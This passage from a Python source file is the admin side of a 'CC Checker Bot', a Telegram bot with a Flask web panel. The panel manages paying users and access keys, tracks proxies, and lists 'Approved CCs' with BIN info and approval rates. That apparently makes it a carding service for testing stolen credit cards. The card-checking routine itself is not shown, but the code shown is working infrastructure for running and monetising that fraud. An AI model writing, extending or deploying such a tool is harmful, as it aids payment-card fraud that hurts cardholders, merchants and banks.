    db_get_or_create_user(target_id)
    db_grant_access(target_id)
    bot.send_message(chat_id, f"✅ Access granted to <code>{target_id}</code>", parse_mode="HTML")
    try:
        bot.send_message(target_id, "\n".join([
            "╔══════════════════════╗",
            "║  🎉  <b>ACCESS GRANTED</b>  🎉  ║",
            "╚══════════════════════╝",
            "",
            "✅ Your access has been activated by the admin!",
            "",
            "Use /help to see all commands.",
        ]), parse_mode="HTML")
    except:
        pass

@bot.message_handler(commands=["removeuser"])
def cmd_removeuser(msg):
    chat_id = msg.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "❌ Admin only.")
        return
    parts = msg.text.split(None, 1)
    if len(parts) < 2:
        bot.send_message(chat_id, "❌ Usage: /removeuser <TelegramID>")
        return
    try:
        target_id = int(parts[1].strip())
    except:
        bot.send_message(chat_id, "❌ Invalid Telegram ID.")
        return
    db_revoke_access(target_id)
    bot.send_message(chat_id, f"✅ Access revoked for <code>{target_id}</code>", parse_mode="HTML")

@bot.message_handler(commands=["users"])
def cmd_users(msg):
    chat_id = msg.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "❌ Admin only.")
        return
    users = db_get_all_users()
    if not users:
        bot.send_message(chat_id, "📭 No users yet.")
        return
    lines = []
    for i, u in enumerate(users[:20]):
        name   = u.get("first_name") or u.get("username") or u["telegram_id"]
        status = "✅" if u["has_access"] else "❌"
        lines.append(f"{i+1}. {status} {name} (ID: {u['telegram_id']})\n   Checked: {u['total_checked']} | Approved: {u['total_approved']}")
    bot.send_message(chat_id,
        f"👥 <b>Users ({len(users)} total):</b>\n\n" + "\n\n".join(lines),
        parse_mode="HTML"
    )

@bot.message_handler(commands=["allusers"])
def cmd_allusers(msg):
    chat_id = msg.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "❌ Admin only.")
        return
    users = db_get_all_users()
    lines = []
    for u in users:
        name   = u.get("first_name") or u.get("username") or u["telegram_id"]
        status = "✅" if u["has_access"] else "❌"
        proxy  = "🌐" if u.get("proxy") else ""
        lines.append(f"{status}{proxy} <code>{u['telegram_id']}</code> — {name} | ✅{u['total_approved']}/💳{u['total_checked']}")
    header = f"👥 <b>All Users ({len(users)}):</b>\n\n"
    msg_text = header + "\n".join(lines)
    # Split into chunks
    chunks = []
    chunk = header
    for line in lines:
        if len(chunk) + len(line) + 1 > 3800:
            chunks.append(chunk)
            chunk = ""
        chunk += line + "\n"
    if chunk:
        chunks.append(chunk)
    for c in chunks:
        bot.send_message(chat_id, c, parse_mode="HTML")

# ============================================================
# WEB ADMIN PANEL
# ============================================================

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CC Bot Admin Panel</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#0f1117;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
  .header{background:#1a1d2e;border-bottom:1px solid #2d3748;padding:16px 24px;display:flex;align-items:center;justify-content:space-between}
  .header h1{font-size:20px;font-weight:700}
  .header h1 span{color:#3b82f6}
  .btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;border-radius:8px;border:none;cursor:pointer;font-size:14px;font-weight:500;text-decoration:none;transition:opacity .2s}
  .btn-primary{background:#3b82f6;color:#fff}.btn-primary:hover{opacity:.85}
  .btn-danger{background:#ef4444;color:#fff}.btn-danger:hover{opacity:.85}
  .btn-success{background:#22c55e;color:#fff}.btn-success:hover{opacity:.85}
  .btn-sm{padding:4px 12px;font-size:13px}
  .btn-outline{background:transparent;color:#94a3b8;border:1px solid #2d3748}.btn-outline:hover{background:#1e2233}
  .nav{background:#1a1d2e;border-bottom:1px solid #2d3748;padding:0 24px;display:flex;gap:0}
  .nav a{display:block;padding:12px 16px;font-size:14px;color:#64748b;text-decoration:none;border-bottom:2px solid transparent;transition:all .2s}
  .nav a:hover{color:#e2e8f0}.nav a.active{color:#3b82f6;border-bottom-color:#3b82f6}
  .main{padding:24px;max-width:1400px;margin:0 auto}
  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
  .stat-card{background:#1a1d2e;border:1px solid #2d3748;border-radius:12px;padding:20px}
  .stat-card .label{font-size:13px;color:#64748b;margin-bottom:6px}
  .stat-card .value{font-size:28px;font-weight:700}
  .stat-card .value.green{color:#22c55e}.stat-card .value.blue{color:#3b82f6}
  .card{background:#1a1d2e;border:1px solid #2d3748;border-radius:12px;overflow:hidden;margin-bottom:24px}
  .card-header{padding:16px 20px;border-bottom:1px solid #2d3748;display:flex;align-items:center;justify-content:space-between}
  .card-header h2{font-size:16px;font-weight:600}
  table{width:100%;border-collapse:collapse;font-size:14px}
  thead tr{background:#161926}
  th{padding:12px 16px;text-align:left;color:#64748b;font-weight:500;font-size:13px}
  td{padding:12px 16px;border-top:1px solid #1e2a3a;vertical-align:middle}
  tr:hover td{background:#1e2233}
  .badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:12px;font-weight:500}
  .badge-green{background:#22c55e22;color:#22c55e}.badge-red{background:#ef444422;color:#ef4444}
  .badge-blue{background:#3b82f622;color:#3b82f6}
  .mono{font-family:monospace;font-size:13px}
  .login-box{max-width:400px;margin:80px auto;background:#1a1d2e;border:1px solid #2d3748;border-radius:16px;padding:40px}
  .login-box h2{text-align:center;margin-bottom:6px;font-size:22px}
  .login-box p{text-align:center;color:#64748b;font-size:14px;margin-bottom:28px}
  input{width:100%;background:#161926;border:1px solid #2d3748;border-radius:8px;padding:10px 14px;color:#e2e8f0;font-size:14px;outline:none;transition:border-color .2s}
  input:focus{border-color:#3b82f6}
  .mt-4{margin-top:16px}.gap-2{gap:8px;display:flex}
  .flash{padding:12px 20px;border-radius:8px;margin-bottom:16px;font-size:14px}
  .flash-success{background:#22c55e22;border:1px solid #22c55e44;color:#22c55e}
  .flash-error{background:#ef444422;border:1px solid #ef444444;color:#ef4444}
  .empty{text-align:center;padding:48px;color:#64748b}
  .key-box{background:#161926;border:1px solid #22c55e44;border-radius:8px;padding:16px;margin-bottom:16px}
  .key-box .key-val{font-family:monospace;font-size:16px;color:#22c55e;word-break:break-all}
  .section-title{font-size:18px;font-weight:700;margin-bottom:16px;color:#e2e8f0}
  .form-row{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
  .form-row input{flex:1;min-width:200px}
</style>
</head>
<body>

{% if not logged_in %}
<div class="login-box">
  <h2>🔐 Admin Panel</h2>
  <p>Enter the web admin password to continue</p>
  {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Admin password" autofocus>
    <button type="submit" class="btn btn-primary mt-4" style="width:100%">Login</button>
  </form>
</div>

{% else %}

<div class="header">
  <h1>🤖 CC Bot <span>Admin</span></h1>
  <div style="display:flex;gap:10px;align-items:center">
    <span style="font-size:13px;color:#64748b">Bot: @{{ bot_username }}</span>
    <a href="/logout" class="btn btn-outline btn-sm">Logout</a>
  </div>
</div>

<nav class="nav">
  <a href="/?tab=overview" class="{{ 'active' if tab=='overview' else '' }}">📊 Overview</a>
  <a href="/?tab=users" class="{{ 'active' if tab=='users' else '' }}">👥 Users</a>
  <a href="/?tab=approved" class="{{ 'active' if tab=='approved' else '' }}">✅ Approved CCs</a>
  <a href="/?tab=results" class="{{ 'active' if tab=='results' else '' }}">📋 All Results</a>
  <a href="/?tab=keys" class="{{ 'active' if tab=='keys' else '' }}">🔑 Keys</a>
</nav>

<div class="main">
  {% if flash_msg %}
  <div class="flash flash-success">{{ flash_msg }}</div>
  {% endif %}

  {% if tab == 'overview' %}
  <div class="stats-grid">
    <div class="stat-card"><div class="label">Total Users</div><div class="value blue">{{ stats.total_users }}</div></div>
    <div class="stat-card"><div class="label">Active Users</div><div class="value green">{{ stats.active_users }}</div></div>
    <div class="stat-card"><div class="label">Cards Checked</div><div class="value">{{ stats.total_checked }}</div></div>
    <div class="stat-card"><div class="label">Total Approved</div><div class="value green">{{ stats.total_approved }}</div></div>
    <div class="stat-card"><div class="label">Approval Rate</div><div class="value green">{{ stats.approval_rate }}%</div></div>
    <div class="stat-card"><div class="label">Keys Generated</div><div class="value">{{ stats.total_keys }}</div></div>
  </div>

  <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
    <div class="card">
      <div class="card-header"><h2>Recent Approved CCs</h2></div>
      <table>
        <thead><tr><th>CC (masked)</th><th>BIN Info</th><th>Date</th></tr></thead>
        <tbody>
          {% for r in recent_approved %}
          <tr>
            <td class="mono" style="color:#22c55e">{{ r.cc|mask_cc }}</td>
            <td style="font-size:12px;color:#64748b">{{ r.bin_info or '—' }}</td>
            <td style="font-size:12px;color:#64748b">{{ r.checked_at[:16] }}</td>
          </tr>
          {% else %}
          <tr><td colspan="3" class="empty">No approved cards yet</td></tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
    <div class="card">
      <div class="card-header"><h2>Top Users</h2></div>
      <table>
        <thead><tr><th>User</th><th>Checked</th><th>Approved</th></tr></thead>
        <tbody>
          {% for u in top_users %}
          <tr>
            <td>{{ u.first_name or u.username or u.telegram_id }}</td>
            <td>{{ u.total_checked }}</td>
            <td style="color:#22c55e">{{ u.total_approved }}</td>
          </tr>
          {% else %}
          <tr><td colspan="3" class="empty">No users yet</td></tr>
          {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

  {% elif tab == 'users' %}
  <div class="card-header" style="padding:0 0 16px 0">
    <h2 class="section-title">👥 Users ({{ users|length }} total)</h2>
    <form method="POST" action="/admin/adduser" style="display:flex;gap:10px">
      <input name="telegram_id" placeholder="Telegram ID" style="width:200px">
      <button type="submit" class="btn btn-success btn-sm">Grant Access</button>
    </form>
  </div>
  <div class="card">
    <table>
      <thead><tr><th>User</th><th>Telegram ID</th><th>Status</th><th>Checked</th><th>Approved</th><th>Proxy</th><th>Actions</th></tr></thead>
      <tbody>
        {% for u in users %}
        <tr>
          <td>{{ u.first_name or u.username or '—' }}</td>
          <td class="mono">{{ u.telegram_id }}</td>
          <td><span class="badge {{ 'badge-green' if u.has_access else 'badge-red' }}">{{ 'Active' if u.has_access else 'No Access' }}</span></td>
          <td>{{ u.total_checked }}</td>
          <td style="color:#22c55e">{{ u.total_approved }}</td>
          <td style="font-size:12px;color:#64748b">{{ '🌐 Set' if u.proxy else '—' }}</td>
          <td>
            {% if u.has_access %}
            <form method="POST" action="/admin/revokeuser" style="display:inline">
              <input type="hidden" name="telegram_id" value="{{ u.telegram_id }}">
              <button type="submit" class="btn btn-danger btn-sm">Revoke</button>
            </form>
            {% else %}
            <form method="POST" action="/admin/grantuser" style="display:inline">
              <input type="hidden" name="telegram_id" value="{{ u.telegram_id }}">
              <button type="submit" class="btn btn-success btn-sm">Grant</button>
            </form>
            {% endif %}
          </td>
        </tr>
        {% else %}
        <tr><td colspan="7" class="empty">No users yet</td></tr>
        {% endfor %}
      </tbody>
    </table>
  </div>

  {% elif tab == 'approved' %}
  <p class="section-title">✅ Approved CCs ({{ approved|length }})</p>
  <div class="card">
    <table>
      <thead><tr><th>CC (masked)</th><th>Result</th><th>BIN Info</th><th>User ID</th><th>Date</th></tr></thead>
      <tbody>
        {% for r in approved %}
        <tr>
          <td class="mono" style="color:#22c55e">{{ r.cc|mask_cc }}</td>
          <td style="font-size:13px">{{ r.result.replace('✅ ','') }}</td>
          <td style="font-size:12px;color:#64748b">{{ r.bin_info or '—' }}</td>
          <td class="mono" style="font-size:12px;color:#64748b">{{ r.user_id }}</td>
          <td style="font-size:12px;color:#64748b">{{ r.checked_at[:16] }}</td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="empty">No approved cards yet</td></tr>
        {% endfor %}
      </tbody>
    </table>
  </div>

  {% elif tab == 'results' %}
  <p class="section-title">📋 Recent Results ({{ results|length }})</p>
  <div class="card">
    <table>
      <thead><tr><th>Status</th><th>CC</th><th>Result</th><th>BIN Info</th><th>Date</th></tr></thead>
      <tbody>
        {% for r in results %}
        <tr>
          <td><span class="badge {{ 'badge-green' if r.result.startswith('✅') else 'badge-red' }}">{{ '✅ OK' if r.result.startswith('✅') else '❌ Declined' }}</span></td>
          <td class="mono" style="font-size:13px">{{ r.cc|mask_cc }}</td>
          <td style="font-size:13px;color:#94a3b8">{{ r.result.replace('✅ ','').replace('❌ ','') }}</td>
          <td style="font-size:12px;color:#64748b">{{ r.bin_info or '—' }}</td>
          <td style="font-size:12px;color:#64748b">{{ r.checked_at[:16] }}</td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="empty">No results yet</td></tr>
        {% endfor %}
      </tbody>
    </table>
  </div>

  {% elif tab == 'keys' %}
  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
    <p class="section-title" style="margin:0">🔑 Access Keys</p>
    <form method="POST" action="/admin/genkey">
      <button type="submit" class="btn btn-primary">+ Generate Key</button>
    </form>
  </div>
  {% if new_key %}
  <div class="key-box">
    <div style="font-size:13px;color:#94a3b8;margin-bottom:6px">New key generated — share with user:</div>
    <div class="key-val">{{ new_key }}</div>
  </div>
  {% endif %}
  <div class="card">
    <table>
      <thead><tr><th>Key</th><th>Status</th><th>Used By</th><th>Used At</th><th>Created</th></tr></thead>
      <tbody>
        {% for k in keys %}
        <tr>
          <td class="mono" style="color:#94a3b8">{{ k.key }}</td>
          <td><span class="badge {{ 'badge-red' if k.used_by else 'badge-green' }}">{{ 'Used' if k.used_by else 'Available' }}</span></td>
          <td class="mono" style="font-size:12px;color:#64748b">{{ k.used_by or '—' }}</td>
          <td style="font-size:12px;color:#64748b">{{ (k.used_at or '')[:16] or '—' }}</td>
          <td style="font-size:12px;color:#64748b">{{ k.created_at[:16] }}</td>
        </tr>
        {% else %}
        <tr><td colspan="5" class="empty">No keys yet</td></tr>
        {% endfor %}
      </tbody>
    </table>
  </div>

  {% endif %}
</div>

{% endif %}
</body>
</html>
"""

def get_bot_username():
    try:
        return bot.get_me().username or "ccbot"
    except:
        return "ccbot"

def get_stats():
    users = db_get_all_users()
    total_checked  = sum(u["total_checked"] for u in users)
    total_approved = sum(u["total_approved"] for u in users)
    active_users   = sum(1 for u in users if u["has_access"])
    keys = db_get_all_keys()
    rate = f"{(total_approved/total_checked*100):.1f}" if total_checked > 0 else "0.0"
    return {
        "total_users":   len(users),
        "active_users":  active_users,
        "total_checked": total_checked,
        "total_approved": total_approved,
        "approval_rate": rate,
        "total_keys":    len(keys),
    }

@app.template_filter("mask_cc")
def mask_cc_filter(cc):
    return mask_cc(cc)

def render(tab="overview", flash_msg=None, new_key=None):
    users   = db_get_all_users()
    approved = db_get_approved_results(100)
    results  = db_get_recent_results(50)
    keys     = db_get_all_keys()
    stats    = get_stats()
    top_users = sorted(users, key=lambda u: u["total_approved"], reverse=True)[:5]
    recent_approved = approved[:5]

    return render_template_string(
        ADMIN_TEMPLATE,
        logged_in=True,
        tab=tab,
        flash_msg=flash_msg,
        new_key=new_key,
        users=users,
        approved=approved,
        results=results,
        keys=keys,
        stats=stats,
        top_users=top_users,
        recent_approved=recent_approved,
        bot_username=get_bot_username(),
        error=None,
    )

@app.route("/")
def index():
    if not session.get("admin"):
        return render_template_string(ADMIN_TEMPLATE, logged_in=False, error=None)
    tab      = request.args.get("tab", "overview")
    flash    = session.pop("flash", None)
    new_key  = session.pop("new_key", None)
    return render(tab=tab, flash_msg=flash, new_key=new_key)

@app.route("/login", methods=["POST"])
def login():
    pwd = request.form.get("password","")
    if pwd == WEB_SECRET:
        session["admin"] = True
        return redirect("/")
    return render_template_string(ADMIN_TEMPLATE, logged_in=False, error="Wrong password")

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

@app.route("/admin/genkey", methods=["POST"])
def web_genkey():
    if not session.get("admin"):
        return redirect("/")
    key = db_generate_key(ADMIN_ID)
    session["new_key"] = key
    return redirect("/?tab=keys")

@app.route("/admin/grantuser", methods=["POST"])
def web_grantuser():
    if not session.get("admin"):
        return redirect("/")
    tid = request.form.get("telegram_id","")
    try:
        db_get_or_create_user(int(tid))
        db_grant_access(int(tid))
        session["flash"] = f"✅ Access granted to {tid}"
    except:
        session["flash"] = "❌ Invalid Telegram ID"
    return redirect("/?tab=users")

@app.route("/admin/revokeuser", methods=["POST"])
def web_revokeuser():
    if not session.get("admin"):
        return redirect("/")
    tid = request.form.get("telegram_id","")
    try:
        db_revoke_access(int(tid))
        session["flash"] = f"✅ Access revoked for {tid}"
    except:
        session["flash"] = "❌ Invalid Telegram ID"
    return redirect("/?tab=users")

@app.route("/admin/adduser", methods=["POST"])
def web_adduser():
    if not session.get("admin"):
        return redirect("/")
    tid = request.form.get("telegram_id","")
    try:
        db_get_or_create_user(int(tid))
        db_grant_access(int(tid))
        session["flash"] = f"✅ Access granted to {tid}"
    except:
        session["flash"] = "❌ Invalid Telegram ID"
    return redirect("/?tab=users")

# API endpoints for external use
@app.route("/api/users")
def api_users():
    key = request.headers.get("x-admin-key","")
    if key != str(ADMIN_ID):
        return jsonify({"error":"Unauthorized"}), 401
    return jsonify(db_get_all_users())

@app.route("/api/approved")
def api_approved():
    key = request.headers.get("x-admin-key","")
    if key != str(ADMIN_ID):
        return jsonify({"error":"Unauthorized"}), 401
    return jsonify(db_get_approved_results())

@app.route("/api/results")
def api_results():
    key = request.headers.get("x-admin-key","")
    if key != str(ADMIN_ID):
        return jsonify({"error":"Unauthorized"}), 401
    return jsonify(db_get_recent_results())

# ============================================================
# MAIN — Run bot + web server in parallel
# ============================================================

def run_web():
    app.run(host="0.0.0.0", port=WEB_PORT, debug=False, use_reloader=False)

def run_bot():
    print(f"🔥 CC Checker Bot running...")
    print(f"🌐 Web admin panel: http://localhost:{WEB_PORT}")
    print(f"🔑 Web admin password: {WEB_SECRET}")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)

if __name__ == "__main__":
    init_db()
    print("✅ Database initialized")

    if ADMIN_ID == 0:
        print("⚠️  WARNING: ADMIN_ID is 0 — set your Telegram chat ID at the top of this file!")

    web_thread = threading.Thread(target=run_web, daemon=True)
    web_thread.start()

    run_bot()
